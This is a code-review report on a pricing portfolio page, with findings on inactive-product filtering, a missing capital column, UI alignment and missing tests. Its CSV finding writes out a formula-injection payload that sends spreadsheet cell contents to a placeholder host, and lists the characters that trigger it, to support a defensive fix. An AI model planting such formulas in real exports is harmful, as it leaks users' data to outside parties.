VERDICT: FIX

## Summary
Routed to ui-reviewer (surface ui) and qa-reviewer (the page shows money). The engine use, D68 capital (stock + ad DZD over one row set), blended margin, BENZ removal and admin gating are all correct, and 38/38 tests pass.
The 173,700 worst-case fixture is legitimate. The PRICE.md reference workbook lists ads 1.5 / 2.2 / 2.7, and its worst-case figures (361.18 USD, 92,100 DZD) only come out with 2.70. D68 pins the same inputs. The engine would derive 2.71 (giving 174,041), and that belongs to PRICE-1, not this task.
Four medium findings block the pass: inactive products are counted in the totals, product names reach the CSV without formula neutralisation, the capital column that D68 asks for is missing, and the break-even chip breaks number alignment.

## Findings (ranked)

1. **Medium: inactive products are counted in every total.** `src/app/(app)/app/pricing/page.tsx:18` selects `products` with no `is_active` filter. The brief's edge-case section says to exclude products when the table has an archive flag, and it has `is_active` (`orders/new/page.tsx:18` already filters on it). The local DB holds 26 inactive products. Any of them with cost, stock and ad cost inflates Capital needed, Combined net profit, Stock cost and the totals row. Fix: add `.eq("is_active", true)` to the select. Add a test that an inactive product is excluded, either in a pure filter test or with the filter moved into `pricing-portfolio.ts`.

2. **Medium: CSV formula injection.** In `src/lib/csv.ts:12-16`, `esc()` quotes fields but does not neutralise a value that starts with `=`, `+`, `-`, `@`, TAB or CR. Quoting does not stop Excel or Sheets from evaluating the cell. A product named `=HYPERLINK("http://x/?"&A2,"x")` is exported as a live formula. Only admins can write product names, so the risk inside the portfolio is low. But `toCSV` is shared with `orders/all/orders-all-table.tsx`, where customer names come from anonymous store visitors. Fix this in `esc()`: if the value is a string (not a number) and starts with one of those characters, prefix it with `'`. Leave real numbers alone, so `-10274` stays numeric. Tests: `=cmd`, `+1`, `-x` and `@x` strings get the prefix, and a negative number does not.

3. **Medium: the capital column from D68 is missing.** D68 (1) says "the card **and the column** carry a hint that says 'stock + ads'". The view has the card only: there is no per-row capital cell, no capital total in the totals row and no capital column in the CSV. `capitalNeeded` is called only inside `portfolioTotals` (`src/lib/pricing-portfolio.ts`). Fix: add a `capital` key to `PORTFOLIO_COLUMNS`, computed with `capitalNeeded(row.stockCost, r.totalAdDzd)`. Show it in the table with the "stock + ads" hint, add its total to the totals row, and add it to the CSV. Add a test that the row capital equals the row stock cost plus the row ad DZD, and that the column total equals the card.

4. **Medium (UI): the break-even chip breaks number alignment.** In `src/app/(app)/app/pricing/portfolio-view.tsx:152-158`, the danger chip sits inline in the `text-end` sale-price cell. In the screenshot, 3 200 DA and 7 800 DA no longer line up with the other sale prices, and the column widens, leaving a large gap. Fix: keep the number end-aligned and put the chip in its own fixed slot, for example an `inline-flex` with the number in a fixed-width span. Or move the chip under the product name, where "missing" already appears.

5. **Low: the badge rule differs from the product tab.** `rowBelowBreakEven` (`src/lib/pricing-portfolio.ts:173`) compares the sale price with the toggled scenario's break-even. The product Pricing tab (`pricing-calculator.tsx:192`) and the spec use the medium break-even, so on "worst" more products show the badge than on their own tab. Fix: use `results.medium` for the badge in every scenario, or record the per-scenario rule. Add a test, including the case of a null sale price.

6. **Low: the nav label is stale.** `src/messages/en.json:33` reads "Pricing calculator" and `ar.json:33` reads "حاسبة التسعير", but the page title is "Pricing" / "التسعير" and the screen is no longer a calculator. Fix: change `nav.pricing` to "Pricing" / "التسعير".

7. **Low: the totals margin cell is blank instead of "—".** In `portfolio-view.tsx:176`, a null `totals.margin` renders nothing, while every other missing value on the screen shows "—". Fix: render the same "—" as the body cells.

8. **Low: the error state gives no reason.** `src/app/(app)/app/pricing/error.tsx` shows the generic `errorPage.body`. The four-states rule asks for a reason plus retry. Fix: add a `pricingPortfolio.error` reason string, already listed in the brief's messages, and show it.

9. **Low: totals are wrong past 1,000 products, with no warning.** In `page.tsx:16-20`, PostgREST `max_rows = 1000` also caps `product_costs` and `product_pricing`. This is not urgent at the current size. Fix later: paginate, or compare the count and show a warning.

## Not verified live (no data writes allowed)
These were reviewed from code only and look correct: the empty state (links to /app/products/new), the error state with retry, the loading skeleton, the "—" row with "N products not included", the agent redirect, and the planner redirect. Light theme was not seen live: the reviewer's theme toggle reverted. The builder's screenshots in `docs/design/audit/PRICE-4/` cover light theme. The reviewer screenshots are `review1-1280-en.png` and `review1-390-ar-dark.png`.

## Missing tests
- CSV neutralisation (finding 2), the inactive-product exclusion (finding 1), and the capital row/column (finding 3).
- Worst-case capital with only the medium ad cost set (derived 2.71 gives 174,041), so the typed-versus-derived difference is explicit next to the 173,700 fixture.
- A product with ad cost 0 is included, with capital equal to stock cost.
- A row that computes in only one scenario is counted per scenario, and separate cases for stock-only, cost-only and no-ad-cost rows.
- `rowBelowBreakEven` with a null sale price.
- The `noRevenueRow` margin test uses a state the engine cannot produce. Replace it with a reachable zero-revenue case, or drop it.
- No test covers an agent session redirected from `/app/pricing` and `/app/products/planner`.
